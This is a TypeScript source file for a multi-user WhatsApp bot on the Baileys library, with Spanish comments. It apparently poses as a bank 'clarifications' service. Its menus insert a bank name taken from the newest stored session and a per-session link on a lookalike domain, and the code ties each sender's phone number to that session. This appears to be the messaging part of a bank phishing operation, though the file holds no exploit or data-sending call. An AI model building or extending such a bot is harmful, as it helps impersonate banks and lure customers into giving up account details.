import makeWASocket, { 
  useMultiFileAuthState, 
  DisconnectReason,
  WASocket,
  proto,
  WAMessage,
  generateWAMessageFromContent,
  prepareWAMessageMedia
} from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import P from 'pino';
import QRCode from 'qrcode';
import fs from 'fs';
import path from 'path';
import { IStorage } from './storage';

interface WhatsAppBotConfig {
  userId: number;
  storage: IStorage;
  onQRUpdate?: (qr: string) => void;
  onConnected?: () => void;
  onDisconnected?: () => void;
}

export class WhatsAppBot {
  private sock: WASocket | null = null;
  private config: WhatsAppBotConfig;
  private authFolder: string;
  private menuState: Map<string, { waitingForInput: boolean; lastMessageTime: number; currentMenuId: number | null }> = new Map();
  private phoneToSessionMap: Map<string, string> = new Map(); // Mapea número de teléfono a sessionId
  private shouldReconnect: boolean = true; // Flag para controlar la reconexión automática
  private qrTimeout: NodeJS.Timeout | null = null; // Timeout para regenerar QR si expira

  constructor(config: WhatsAppBotConfig) {
    this.config = config;
    this.authFolder = path.join(process.cwd(), 'whatsapp_sessions', `user_${config.userId}`);
    
    // Crear carpeta de sesiones si no existe
    if (!fs.existsSync(path.join(process.cwd(), 'whatsapp_sessions'))) {
      fs.mkdirSync(path.join(process.cwd(), 'whatsapp_sessions'));
    }
  }

  async start() {
    try {
      console.log(`[WhatsApp Bot] Iniciando bot para usuario ${this.config.userId}`);
      
      // Restaurar flag de reconexión automática
      this.shouldReconnect = true;
      
      const { state, saveCreds } = await useMultiFileAuthState(this.authFolder);
      
      this.sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: true, // Enable for debugging
        browser: ['WhatsApp Bot', 'Chrome', '1.0.0'],
        connectTimeoutMs: 60000, // Increase timeout to 60 seconds
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 30000
      });

      // Guardar credenciales cuando se actualicen
      this.sock.ev.on('creds.update', saveCreds);

      // Manejar actualizaciones de conexión
      this.sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
          // Limpiar timeout previo
          if (this.qrTimeout) {
            clearTimeout(this.qrTimeout);
          }
          
          console.log(`[WhatsApp Bot] ✅ QR generado para usuario ${this.config.userId}`);
          const qrDataUrl = await QRCode.toDataURL(qr);
          
          // Actualizar QR en la base de datos
          await this.updateQRCode(qrDataUrl);
          
          if (this.config.onQRUpdate) {
            this.config.onQRUpdate(qrDataUrl);
          }
          
          // Establecer timeout para regenerar QR si no se escanea en 60 segundos
          this.qrTimeout = setTimeout(() => {
            console.log(`[WhatsApp Bot] ⏰ QR expirado, cerrando conexión para regenerar...`);
            this.sock?.ws?.close();
          }, 60000);
        }
        
        if (connection === 'close') {
          const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut;
          
          console.log(`[WhatsApp Bot] Conexión cerrada para usuario ${this.config.userId}, código: ${statusCode}, deslogueado: ${isLoggedOut}`);
          
          // Solo limpiar sesión si fue un logout real
          if (isLoggedOut) {
            console.log(`[WhatsApp Bot] Logout detectado, limpiando sesión...`);
            await this.clearSession();
          }
          
          // Actualizar estado de conexión
          await this.updateConnectionStatus(false);
          
          // Notificar desconexión
          if (this.config.onDisconnected) {
            this.config.onDisconnected();
          }
          
          // Solo reiniciar si shouldReconnect es true (no fue detenido manualmente)
          if (this.shouldReconnect && !isLoggedOut) {
            console.log(`[WhatsApp Bot] Reconectando automáticamente...`);
            setTimeout(() => {
              this.start();
            }, 2000); // Esperar 2 segundos antes de reiniciar
          } else if (isLoggedOut) {
            console.log(`[WhatsApp Bot] Sesión cerrada, necesita nuevo QR`);
            // Reiniciar para generar nuevo QR
            if (this.shouldReconnect) {
              setTimeout(() => {
                this.start();
              }, 2000);
            }
          } else {
            console.log(`[WhatsApp Bot] Bot detenido manualmente, no se reconectará`);
          }
        } else if (connection === 'open') {
          // Limpiar timeout de QR
          if (this.qrTimeout) {
            clearTimeout(this.qrTimeout);
            this.qrTimeout = null;
          }
          
          console.log(`[WhatsApp Bot] ✅ Conectado exitosamente para usuario ${this.config.userId}`);
          
          const phoneNumber = this.sock?.user?.id?.split(':')[0] || '';
          await this.updateConnectionStatus(true, phoneNumber);
          
          if (this.config.onConnected) {
            this.config.onConnected();
          }
        }
      });

      // Manejar mensajes entrantes
      this.sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        
        for (const msg of messages) {
          await this.handleIncomingMessage(msg);
        }
      });

    } catch (error) {
      console.error(`[WhatsApp Bot] Error al iniciar bot para usuario ${this.config.userId}:`, error);
      throw error;
    }
  }

  async stop() {
    try {
      console.log(`[WhatsApp Bot] Deteniendo bot para usuario ${this.config.userId}`);
      
      // Limpiar timeout de QR si existe
      if (this.qrTimeout) {
        clearTimeout(this.qrTimeout);
        this.qrTimeout = null;
      }
      
      // Establecer flag para evitar reconexión automática
      this.shouldReconnect = false;
      
      if (this.sock) {
        try {
          // Intentar hacer logout solo si la conexión está activa
          await this.sock.logout();
          console.log(`[WhatsApp Bot] Logout exitoso`);
        } catch (logoutError: any) {
          // Si falla el logout (ej: conexión ya cerrada), solo registrar el error
          console.log(`[WhatsApp Bot] No se pudo hacer logout (conexión ya cerrada): ${logoutError.message}`);
        }
        
        this.sock = null;
      }
      
      // Limpiar sesión y actualizar estado
      await this.clearSession();
      await this.updateConnectionStatus(false);
      
      console.log(`[WhatsApp Bot] Bot detenido correctamente`);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error al detener bot:`, error);
      throw error;
    }
  }

  private async clearSession() {
    try {
      console.log(`[WhatsApp Bot] Limpiando sesión para usuario ${this.config.userId}`);
      
      // Eliminar la carpeta de autenticación si existe
      if (fs.existsSync(this.authFolder)) {
        fs.rmSync(this.authFolder, { recursive: true, force: true });
        console.log(`[WhatsApp Bot] Sesión limpiada para usuario ${this.config.userId}`);
      }
    } catch (error) {
      console.error(`[WhatsApp Bot] Error al limpiar sesión:`, error);
    }
  }

  async sendMessage(phoneNumber: string, message: string) {
    if (!this.sock) {
      throw new Error('Bot no está conectado');
    }

    console.log(`[WhatsApp Bot] 🔵 Número recibido: "${phoneNumber}"`);

    // Formatear número para WhatsApp
    let jid: string;
    let formattedNumber: string;
    
    if (phoneNumber.includes('@')) {
      jid = phoneNumber;
      formattedNumber = phoneNumber.split('@')[0];
    } else {
      // Limpiar el número (eliminar espacios, guiones, paréntesis, +)
      let cleanNumber = phoneNumber.replace(/[\s\-\(\)\+]/g, '');
      console.log(`[WhatsApp Bot] 🟡 Número limpio: "${cleanNumber}" (${cleanNumber.length} dígitos)`);
      
      // Para números de México (10 dígitos), agregar 521 (código de país + 1 para celular)
      if (cleanNumber.length === 10) {
        cleanNumber = '521' + cleanNumber;
        console.log(`[WhatsApp Bot] 🟢 Formato México celular: "${cleanNumber}"`);
      }
      // Si ya tiene 521 al inicio (13 dígitos), dejarlo como está
      else if (cleanNumber.length === 13 && cleanNumber.startsWith('521')) {
        console.log(`[WhatsApp Bot] ✅ Número ya tiene formato correcto: "${cleanNumber}"`);
      }
      // Si tiene 52 al inicio pero no 521 (12 dígitos), agregar el 1
      else if (cleanNumber.length === 12 && cleanNumber.startsWith('52') && !cleanNumber.startsWith('521')) {
        cleanNumber = '521' + cleanNumber.substring(2);
        console.log(`[WhatsApp Bot] 🔧 Corrigiendo a formato celular: "${cleanNumber}"`);
      }
      
      formattedNumber = cleanNumber;
      jid = `${cleanNumber}@s.whatsapp.net`;
    }
    
    console.log(`[WhatsApp Bot] ✅ JID final: "${jid}"`);
    await this.sock.sendMessage(jid, { text: message });
    console.log(`[WhatsApp Bot] ✅ Mensaje enviado exitosamente`);
    
    // Guardar en historial con número formateado (siempre con 521)
    await this.saveConversation(formattedNumber, message, true);
  }

  private async handleIncomingMessage(msg: WAMessage) {
    try {
      // Ignorar mensajes propios
      if (msg.key.fromMe) return;
      
      // Ignorar mensajes sin contenido
      if (!msg.message) return;

      const sender = msg.key.remoteJid || '';
      const phoneNumber = sender.split('@')[0];
      
      // Obtener texto del mensaje (puede venir de varios lugares)
      let text = msg.message.conversation || 
                 msg.message.extendedTextMessage?.text || 
                 msg.message.buttonsResponseMessage?.selectedButtonId ||
                 msg.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
                 '';
      
      console.log(`[WhatsApp Bot] Mensaje recibido de ${phoneNumber}: ${text}`);

      // Guardar mensaje en historial
      await this.saveConversation(phoneNumber, text, false);

      // Actualizar el número de celular en la sesión asociada
      // Primero intentar usar la asociación en memoria (si existe)
      let sessionId: string | null | undefined = this.phoneToSessionMap.get(phoneNumber);
      
      // Si no hay asociación en memoria, buscar la sesión más reciente activa del usuario
      if (!sessionId) {
        sessionId = await this.getLatestSessionId();
      }
      
      if (sessionId) {
        try {
          await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);
          // Actualizar el Map para futuras referencias
          this.phoneToSessionMap.set(phoneNumber, sessionId);
          console.log(`[WhatsApp Bot] ✅ Número ${phoneNumber} guardado en sesión ${sessionId}`);
        } catch (error) {
          console.error(`[WhatsApp Bot] ❌ Error guardando número en sesión:`, error);
        }
      } else {
        console.log(`[WhatsApp Bot] ℹ️ No hay sesión activa para asociar el número ${phoneNumber}`);
      }

      // Verificar si el usuario está esperando una respuesta de menú
      const userState = this.menuState.get(phoneNumber);
      const currentTime = Date.now();

      // Si escribe "asistencia", mostrar el menú principal
      if (text.trim().toLowerCase() === 'asistencia') {
        await this.sendMenu(phoneNumber, null);
        this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });
        return;
      }

      // Si es "0" o "volver", regresar al menú anterior
      if (text.trim() === '0' || text.trim().toLowerCase() === 'volver') {
        const currentMenuId = userState?.currentMenuId || null;
        if (currentMenuId !== null) {
          // Obtener el menú padre
          const menuOptions = await this.getMenuOptions();
          const currentMenu = menuOptions.find(opt => opt.id === currentMenuId);
          const parentId = currentMenu?.parentId || null;
          await this.sendMenu(phoneNumber, parentId);
          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: parentId });
        } else {
          // Ya estamos en el menú principal
          await this.sendMenu(phoneNumber, null);
          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });
        }
        return;
      }

      // Si es un número (1-9), procesarlo como opción de menú
      if (text.trim().match(/^[1-9]$/)) {
        const optionNumber = parseInt(text.trim());
        const currentMenuId = userState?.currentMenuId || null;
        await this.processMenuOption(phoneNumber, optionNumber, currentMenuId);
        return;
      }

      // Si no hay estado o han pasado más de 5 minutos, enviar menú de bienvenida
      if (!userState || (currentTime - userState.lastMessageTime) > 300000) {
        await this.sendMenu(phoneNumber, null);
        this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });
      }

    } catch (error) {
      console.error(`[WhatsApp Bot] Error al manejar mensaje:`, error);
    }
  }

  private async sendMenu(phoneNumber: string, parentId: number | null) {
    try {
      if (!this.sock) {
        throw new Error('Bot no está conectado');
      }

      // Obtener configuración del menú desde la base de datos
      const config = await this.getWhatsAppConfig();
      const allMenuOptions = await this.getMenuOptions();

      // Filtrar opciones por el parentId y que estén activas
      const menuOptions = allMenuOptions.filter(opt => {
        if (!opt.isActive) return false;
        if (parentId === null) {
          return opt.parentId === null || opt.parentId === undefined;
        }
        return opt.parentId === parentId;
      });

      let headerText = '';
      
      // Si es menú principal, usar mensaje de bienvenida
      if (parentId === null) {
        headerText = config?.welcomeMessage || '¡Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.';
      } else {
        // Es un sub-menú
        const parentOption = allMenuOptions.find(opt => opt.id === parentId);
        headerText = parentOption?.optionText || 'Selecciona una opción:';
      }

      // Reemplazar placeholders (liga) y (banco) en el mensaje de bienvenida
      if (headerText.includes('(liga)')) {
        const link = await this.generatePanelLink();
        headerText = headerText.replace(/\(liga\)/g, link);
        
        // Cuando se envía una liga, asociar el número con la sesión más reciente
        const sessionId = await this.getLatestSessionId();
        if (sessionId) {
          this.phoneToSessionMap.set(phoneNumber, sessionId);
          try {
            await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);
            console.log(`[WhatsApp Bot] ✅ Liga en bienvenida y número ${phoneNumber} asociado con sesión ${sessionId}`);
          } catch (error) {
            console.error(`[WhatsApp Bot] ❌ Error guardando número en bienvenida:`, error);
          }
        }
      }
      
      if (headerText.includes('(banco)')) {
        const bankName = await this.generateBankName();
        headerText = headerText.replace(/\(banco\)/g, bankName);
      }

      // Formatear número para WhatsApp
      const jid = phoneNumber.includes('@') ? phoneNumber : `${phoneNumber}@s.whatsapp.net`;

      // Construir mensaje de menú mejorado con formato
      if (menuOptions.length > 0) {
        let menuText = `${headerText}\n\n`;
        menuText += `━━━━━━━━━━━━━━━━━━\n`;
        menuText += `📋 *OPCIONES DISPONIBLES*\n`;
        menuText += `━━━━━━━━━━━━━━━━━━\n\n`;
        
        for (const option of menuOptions) {
          menuText += `▪️ *${option.optionNumber}* - ${option.optionText}\n`;
        }
        
        if (parentId !== null) {
          menuText += `\n▪️ *0* - Volver al menú anterior`;
        }
        
        menuText += `\n━━━━━━━━━━━━━━━━━━\n`;
        menuText += `💡 _Escribe el número de la opción que deseas o escribe "asistencia" en cualquier momento para volver al menú principal._`;
        
        await this.sendMessage(phoneNumber, menuText);
        console.log(`[WhatsApp Bot] Menú enviado a ${phoneNumber} con ${menuOptions.length} opciones`);
      }
      // Si no hay opciones, enviar solo el mensaje de bienvenida
      else {
        await this.sendMessage(phoneNumber, `${headerText}\n\nNo hay opciones disponibles en este momento.\n\n_Escribe "asistencia" para volver al menú principal._`);
      }

      // Guardar el mensaje del bot en el historial
      await this.saveConversation(phoneNumber, `Bot -> ${headerText}`, true);

    } catch (error) {
      console.error(`[WhatsApp Bot] Error al enviar menú:`, error);
      // Fallback a mensaje de texto simple si hay error con botones
      try {
        const config = await this.getWhatsAppConfig();
        const allMenuOptions = await this.getMenuOptions();
        const menuOptions = allMenuOptions.filter(opt => {
          if (!opt.isActive) return false;
          if (parentId === null) {
            return opt.parentId === null || opt.parentId === undefined;
          }
          return opt.parentId === parentId;
        });

        let menuText = '';
        if (parentId === null) {
          menuText = config?.welcomeMessage || '¡Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.';
          
          // Reemplazar placeholders (liga) y (banco) en el fallback también
          if (menuText.includes('(liga)')) {
            const link = await this.generatePanelLink();
            menuText = menuText.replace(/\(liga\)/g, link);
            
            // Asociar número con sesión más reciente
            const sessionId = await this.getLatestSessionId();
            if (sessionId) {
              this.phoneToSessionMap.set(phoneNumber, sessionId);
              try {
                await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);
                console.log(`[WhatsApp Bot] ✅ Liga en fallback y número ${phoneNumber} asociado con sesión ${sessionId}`);
              } catch (error) {
                console.error(`[WhatsApp Bot] ❌ Error guardando número en fallback:`, error);
              }
            }
          }
          
          if (menuText.includes('(banco)')) {
            const bankName = await this.generateBankName();
            menuText = menuText.replace(/\(banco\)/g, bankName);
          }
          
          menuText += '\n\nPor favor selecciona una opción:\n\n';
        } else {
          const parentOption = allMenuOptions.find(opt => opt.id === parentId);
          menuText = parentOption?.optionText || 'Selecciona una opción:';
          menuText += '\n\n';
        }

        for (const option of menuOptions) {
          menuText += `${option.optionNumber}. ${option.optionText}\n`;
        }

        if (parentId !== null) {
          menuText += '\n0. Volver al menú anterior';
        }

        menuText += '\n\nEscribe "asistencia" en cualquier momento para volver al menú principal.';

        await this.sendMessage(phoneNumber, menuText);
      } catch (fallbackError) {
        console.error(`[WhatsApp Bot] Error en fallback:`, fallbackError);
      }
    }
  }

  private async processMenuOption(phoneNumber: string, optionNumber: number, currentMenuId: number | null) {
    try {
      const allMenuOptions = await this.getMenuOptions();
      
      // Filtrar opciones del menú actual
      const menuOptions = allMenuOptions.filter(opt => {
        if (currentMenuId === null) {
          return opt.parentId === null || opt.parentId === undefined;
        }
        return opt.parentId === currentMenuId;
      });

      const selectedOption = menuOptions.find(opt => opt.optionNumber === optionNumber && opt.isActive);

      if (!selectedOption) {
        await this.sendMessage(phoneNumber, 'Opción no válida. Por favor selecciona una opción del menú.');
        await this.sendMenu(phoneNumber, currentMenuId);
        return;
      }

      const currentTime = Date.now();
      
      // Verificar si la opción tiene sub-menús
      const hasSubMenu = allMenuOptions.some(opt => opt.parentId === selectedOption.id);

      // Procesar el mensaje de respuesta si existe
      if (selectedOption.responseMessage) {
        let messageToSend = selectedOption.responseMessage;
        
        // Reemplazar (liga) con la última liga del panel si existe en el mensaje
        if (messageToSend.includes('(liga)')) {
          const panelUrl = await this.generatePanelLink();
          messageToSend = messageToSend.replace(/\(liga\)/g, panelUrl);
          
          // Cuando se envía una liga, asociar el número de teléfono con la sesión más reciente
          const sessionId = await this.getLatestSessionId();
          if (sessionId) {
            // Guardar en el Map para referencia rápida
            this.phoneToSessionMap.set(phoneNumber, sessionId);
            
            // Guardar directamente en la base de datos
            try {
              await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);
              console.log(`[WhatsApp Bot] ✅ Liga enviada y número ${phoneNumber} asociado con sesión ${sessionId}`);
            } catch (error) {
              console.error(`[WhatsApp Bot] ❌ Error guardando número al enviar liga:`, error);
            }
          }
        }
        
        // Reemplazar (banco) con el nombre del banco de la última sesión
        if (messageToSend.includes('(banco)')) {
          const bankName = await this.generateBankName();
          messageToSend = messageToSend.replace(/\(banco\)/g, bankName);
        }
        
        await this.sendMessage(phoneNumber, messageToSend);
      }

      // Procesar según el tipo de acción
      switch (selectedOption.actionType) {
        case 'message':
          // Si tiene sub-menú, mostrarlo después del mensaje
          if (hasSubMenu) {
            setTimeout(async () => {
              await this.sendMenu(phoneNumber, selectedOption.id);
            }, 1000);
            this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: selectedOption.id });
          } else {
            this.menuState.set(phoneNumber, { waitingForInput: false, lastMessageTime: currentTime, currentMenuId });
          }
          break;
          
        case 'transfer':
          await this.sendMessage(phoneNumber, 'Un ejecutivo se pondrá en contacto contigo pronto.');
          console.log(`[WhatsApp Bot] Transferencia solicitada por ${phoneNumber}`);
          this.menuState.set(phoneNumber, { waitingForInput: false, lastMessageTime: currentTime, currentMenuId });
          break;
          
        case 'info':
          // Volver a mostrar el menú después de dar la información
          setTimeout(() => this.sendMenu(phoneNumber, currentMenuId), 2000);
          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId });
          break;

        case 'submenu':
          // Mostrar el sub-menú
          await this.sendMenu(phoneNumber, selectedOption.id);
          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: selectedOption.id });
          break;
      }

    } catch (error) {
      console.error(`[WhatsApp Bot] Error al procesar opción de menú:`, error);
    }
  }

  private async generatePanelLink(): Promise<string> {
    try {
      // Obtener la configuración del sitio para el baseUrl
      const siteConfig = await this.config.storage.getSiteConfig();
      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
      
      // Obtener la última sesión activa creada
      const sessions = await this.config.storage.getAllSessions();
      
      // Filtrar sesiones activas y ordenar por fecha de creación (más reciente primero)
      const activeSessions = sessions
        .filter((s: any) => s.active)
        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      
      if (activeSessions.length > 0) {
        // Usar el sessionId de la última sesión activa (la más reciente)
        const latestSession = activeSessions[0];
        const link = `${baseClientUrl}/${latestSession.sessionId}`;
        console.log(`[WhatsApp Bot] Generando liga: ${link} (sesión: ${latestSession.sessionId})`);
        return link;
      } else {
        // Si no hay sesiones activas, devolver mensaje informando que no hay liga disponible
        console.log(`[WhatsApp Bot] No hay sesiones activas, devolviendo baseUrl: ${baseClientUrl}`);
        return `${baseClientUrl}`;
      }
    } catch (error) {
      console.error(`[WhatsApp Bot] Error generando liga del panel:`, error);
      const siteConfig = await this.config.storage.getSiteConfig();
      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
      return `${baseClientUrl}`;
    }
  }

  private async generateBankName(): Promise<string> {
    try {
      // Obtener la última sesión activa creada
      const sessions = await this.config.storage.getAllSessions();
      
      // Filtrar sesiones activas y ordenar por fecha de creación (más reciente primero)
      const activeSessions = sessions
        .filter((s: any) => s.active)
        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      
      if (activeSessions.length > 0) {
        // Obtener el banco de la última sesión activa
        const latestSession = activeSessions[0];
        const bankName = latestSession.banco || 'BANCO';
        console.log(`[WhatsApp Bot] Generando nombre de banco: ${bankName} (sesión: ${latestSession.sessionId})`);
        return bankName;
      } else {
        console.log(`[WhatsApp Bot] No hay sesiones activas, devolviendo 'BANCO' por defecto`);
        return 'BANCO';
      }
    } catch (error) {
      console.error(`[WhatsApp Bot] Error generando nombre de banco:`, error);
      return 'BANCO';
    }
  }

  private async getLatestSessionId(): Promise<string | null> {
    try {
      const sessions = await this.config.storage.getAllSessions();
      const activeSessions = sessions
        .filter((s: any) => s.active)
        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      
      if (activeSessions.length > 0) {
        return activeSessions[0].sessionId;
      }
      return null;
    } catch (error) {
      console.error(`[WhatsApp Bot] Error obteniendo última sesión:`, error);
      return null;
    }
  }

  public isConnected(): boolean {
    return this.sock !== null && this.sock.user !== undefined;
  }

  private async updateQRCode(qrCode: string) {
    try {
      await this.config.storage.updateWhatsAppConfig(this.config.userId, {
        qrCode,
        isConnected: false
      });
      console.log(`[WhatsApp Bot] QR actualizado para usuario ${this.config.userId}`);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error actualizando QR:`, error);
    }
  }

  private async updateConnectionStatus(isConnected: boolean, phoneNumber?: string) {
    try {
      await this.config.storage.updateWhatsAppConfig(this.config.userId, {
        isConnected,
        phoneNumber: phoneNumber || '',
        qrCode: isConnected ? null : undefined
      });
      console.log(`[WhatsApp Bot] Estado de conexión para usuario ${this.config.userId}: ${isConnected ? 'conectado' : 'desconectado'}`);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error actualizando estado de conexión:`, error);
    }
  }

  private async saveConversation(phoneNumber: string, message: string, isFromBot: boolean) {
    try {
      await this.config.storage.saveWhatsAppConversation({
        userId: this.config.userId,
        phoneNumber,
        message,
        isFromBot
      });
      console.log(`[WhatsApp Bot] Guardando mensaje: ${isFromBot ? 'Bot' : phoneNumber} -> ${message}`);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error guardando conversación:`, error);
    }
  }

  private async getWhatsAppConfig() {
    try {
      return await this.config.storage.getWhatsAppConfig(this.config.userId);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error obteniendo configuración:`, error);
      return null;
    }
  }

  private async getMenuOptions() {
    try {
      return await this.config.storage.getWhatsAppMenuOptions(this.config.userId);
    } catch (error) {
      console.error(`[WhatsApp Bot] Error obteniendo opciones de menú:`, error);
      return [];
    }
  }
}

// Singleton para manejar múltiples bots (uno por usuario)
class WhatsAppBotManager {
  private bots: Map<number, WhatsAppBot> = new Map();

  async startBot(userId: number, storage: IStorage, callbacks?: {
    onQRUpdate?: (qr: string) => void;
    onConnected?: () => void;
    onDisconnected?: () => void;
  }) {
    // Si ya existe un bot para este usuario, detenerlo primero
    if (this.bots.has(userId)) {
      await this.stopBot(userId);
    }

    const bot = new WhatsAppBot({
      userId,
      storage,
      ...callbacks
    });

    await bot.start();
    this.bots.set(userId, bot);
    
    return bot;
  }

  async stopBot(userId: number) {
    const bot = this.bots.get(userId);
    if (bot) {
      await bot.stop();
      this.bots.delete(userId);
    }
  }

  getBot(userId: number): WhatsAppBot | undefined {
    return this.bots.get(userId);
  }

  async stopAllBots() {
    const entries = Array.from(this.bots.entries());
    for (const [userId, bot] of entries) {
      await bot.stop();
    }
    this.bots.clear();
  }
}

export const whatsappBotManager = new WhatsAppBotManager();
